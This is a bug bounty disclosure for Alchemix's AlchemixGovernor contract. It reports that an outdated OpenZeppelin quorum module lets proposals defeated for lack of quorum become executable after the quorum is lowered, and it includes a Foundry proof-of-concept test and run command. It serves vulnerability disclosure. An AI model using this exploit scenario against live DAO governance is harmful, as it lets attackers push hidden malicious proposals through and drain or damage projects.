# 30556 - \[SC - Low] Past defeated proposals may become executable i...

Submitted on Apr 30th 2024 at 18:46:43 UTC by @mt030d for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #30556

Report type: Smart Contract

Report severity: Low

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/AlchemixGovernor.sol>

Impacts:

* Manipulation of governance voting result deviating from voted outcome and resulting in a direct change from intended effect of original results

## Description

## Brief/Intro

The `AlchemixGovernor` contract inherits the `L2GovernorVotesQuorumFraction` contract, which is based on an outdated version of OpenZeppelin's `GovernorVotesQuorumFraction` contract that has a known vulnerability.

This vulnerability allows past proposals to become executable if they were defeated only due to a lack of quorum, and the number of votes they received meets the new quorum requirement.

## Vulnerability Details

The `AlchemixGovernor` contract inherits the `L2GovernorVotesQuorumFraction` contract, a modified version of OpenZeppelin's `GovernorVotesQuorumFraction` contract at version v4.5.0. However, this version has a [known vulnerability](https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-xrc4-737v-9q75), patched in v4.7.2.

As a result, the `AlchemixGovernor` contract is affected by the same vulnerability: when a proposal is passed to lower the quorum requirement, past proposals may become executable if they were defeated only due to a lack of quorum, and the number of votes they received meets the new quorum requirement.

Please see the PoC for a concrete scenario of this vulnerability.

## Impact Details

An under-quorum proposal should be unable to execute after the vote period.

However, when a proposal is passed to lower the quorum requirement, past proposals become executable if they were defeated only due to a lack of quorum, and the number of votes they received meets the new quorum requirement.

A malicious user could propose a malicious proposal and vote for it. Since it's below the quorum, it may go unnoticed by the DAO. Later, they can propose a proposal to lower the quorum for other valid reasons. If the proposal is executed, their hidden malicious proposal may become executable, potentially causing monetary and reputational harm to the project.

## References

* [AlchemixGovernor contract](https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/AlchemixGovernor.sol#L16)
* [L2GovernorVotesQuorumFraction contract](https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/governance/L2GovernorVotesQuorumFraction.sol)
* [The issue for OpenZeppelin's GovernorVotesQuorumFraction](https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-xrc4-737v-9q75)

## Proof of Concept

```solidity
// ./test/PoC.t.sol
// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/test/BaseTest.sol";

contract PoC is BaseTest {
    function setUp() public {
        setupContracts(block.timestamp);

        // Create veALCX for admin
        createVeAlcx(admin, TOKEN_100K, MAXTIME, false);

        // Create veALCX for 0xbeef
        createVeAlcx(beef, TOKEN_1 * 10_000, MAXTIME, false);

        // Can't propose and vote in the same block as a veALCX is created
        hevm.warp(block.timestamp + 1);
    }

    function test_PastDefeatedProposalCanPassAfterQuorumDecrease() public {
        assertFalse(voter.isWhitelisted(usdc));

        // craft a proposal to make voter whitelist usdc
        (address[] memory t, uint256[] memory v, bytes[] memory c, string memory d) = craftTestProposal();

        // propose
        hevm.startPrank(admin);
        uint256 pid = governor.propose(t, v, c, d, MAINNET);
        hevm.warp(block.timestamp + governor.votingDelay() + 1); // delay
        hevm.stopPrank();

        // vote
        hevm.startPrank(beef);
        governor.castVote(pid, 1);
        hevm.warp(block.timestamp + governor.votingPeriod() + 1); // voting period
        hevm.warp(block.timestamp + timelockExecutor.executionDelay() + 1); // execution delay
        hevm.stopPrank();

        uint256 votingPower = veALCX.getVotes(beef);
        uint256 quorum = governor.quorum(block.timestamp);
        assertGt(quorum, votingPower, "quorum should be greater than voting power");

        // execute - fail due to lack of quorum
        hevm.expectRevert(abi.encodePacked("Governor: proposal not successful"));
        governor.execute(t, v, c, keccak256(bytes(d)), MAINNET);

        // assume the DAO decides to decrease the QuorumNumerator
        updateQuorumNumerator(50);

        // As a result, a a past defeated proposal due to lack of quorum now meets the new quorum requirement
        votingPower = veALCX.getVotes(beef);
        quorum = governor.quorum(block.timestamp);
        assertLt(quorum, votingPower, "quorum should be less than voting power");


        // now the past defeated proposal can be executed
        governor.execute(t, v, c, keccak256(bytes(d)), MAINNET);
        assertTrue(voter.isWhitelisted(usdc));
    }

    function craftTestProposal()
        internal
        view
        returns (address[] memory targets, uint256[] memory values, bytes[] memory calldatas, string memory description)
    {
        targets = new address[](1);
        targets[0] = address(voter);
        values = new uint256[](1);
        values[0] = 0;
        calldatas = new bytes[](1);
        calldatas[0] = abi.encodeWithSelector(voter.whitelist.selector, usdc);
        description = "Whitelist USDC";
    }

    function updateQuorumNumerator(uint256 newQuorumNumerator) internal {

        address[] memory targets = new address[](1);
        targets[0] = address(governor);
        uint256[] memory values = new uint256[](1);
        values[0] = 0;
        bytes[] memory calldatas = new bytes[](1);
        calldatas[0] = abi.encodeWithSelector(governor.updateQuorumNumerator.selector, newQuorumNumerator);
        string memory description = "Update QuorumNumerator";

        hevm.startPrank(admin);
        uint256 pid = governor.propose(targets, values, calldatas, description, MAINNET);
        hevm.warp(block.timestamp + governor.votingDelay() + 1); // delay

        governor.castVote(pid, 1);
        hevm.warp(block.timestamp + governor.votingPeriod() + 1); // voting period
        hevm.warp(block.timestamp + timelockExecutor.executionDelay() + 1); // execution delay

        governor.execute(targets, values, calldatas, keccak256(bytes(description)), MAINNET);
        hevm.stopPrank();
    }
}
```

This PoC inherits the [BaseTest](https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/test/BaseTest.sol) contract for its `setupContracts()` and `createVeAlcx()` functionalities.

The `test_PastDefeatedProposalCanPassAfterQuorumDecrease()` test case demonstrates the following scenario:

1. An admin proposes a proposal to whitelist USDC in the Voter contract.
2. The user (beef) votes in favor of this proposal.
3. After the voting period, the proposal cannot be executed since the quorum is not reached.
4. However, if the DAO later decides to decrease the quorum requirement, the previously defeated proposal can now pass and be executed.

Run the PoC using the following command:

```
forge test --mt test_PastDefeatedProposalCanPassAfterQuorumDecrease --fork-url $URL --fork-block-number=17133822
```

This should pass the test case.
